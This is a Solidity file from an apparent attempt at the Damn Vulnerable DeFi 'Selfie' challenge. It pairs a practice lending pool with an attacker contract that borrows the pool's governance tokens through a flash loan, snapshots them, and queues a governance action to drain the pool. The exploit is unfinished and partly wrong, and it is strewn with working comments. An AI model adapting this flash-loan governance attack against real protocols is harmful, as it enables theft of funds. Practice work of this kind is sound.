// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

import "hardhat/console.sol";

contract SelfiePoolAttacker {
    address public attacker;
    DamnValuableTokenSnapshot public token;
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    uint256 public actionId;

    constructor (address attackerAddress, address tokenAddress, address poolAddress, address governanceAddress) {
        token = DamnValuableTokenSnapshot(tokenAddress);
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        attacker = attackerAddress;
    }

    function attack(uint256 amount) external {
        console.log('ATACK');
        pool.flashLoan(amount);
        // actionId = 6666666;
    }

    // Take the max amount of flash loan from the pool, take governance over, queue an action that drains all funds
    // from the pool, advance 2 days in time, execute action
    function receiveTokens(
        address tokenAddress, 
        uint256 amount
    ) external {
       console.log('catch flash loan');
       token.snapshot();
    //    token.withdraw();
    // Return the flash loan
    // uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
    //     uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
       actionId = governance.queueAction(
            // address(this),  // != address(this)
            attacker,
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                attacker
            ),
            amount
     
       );
        console.log('actionId', actionId);
        // require("Flash loan hasn't been paid back");
        token.transfer(msg.sender, amount);   // PAY BACK;

          // transfer fo me

            // PASS ::
        //      require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
        // require(receiver != address(this), "Cannot queue actions that affect Governance");
 
            // 2 days? -> executeAction (PASS::_canBeExecuted)-> drainAllFunds
 
        // governance.executeAction(actionId); after 2 days
        //    ddress receiver, bytes 
        // calldata data, // abi.encodedSignature ???
        // uint256 weiAmount
    }

    // receive() external payable {}
}

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {

    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() { // bypass this shit: Подсказка же???
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);

        // DEPLOY???
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        console.log('========flash loan=======');
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        token.transfer(msg.sender, borrowAmount);        
        
        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        
        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    // call with abi???? onlyGovernance meta...
    function drainAllFunds(address receiver) external onlyGovernance {
        console.log('VIII');
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        
        emit FundsDrained(receiver, amount);
    }
}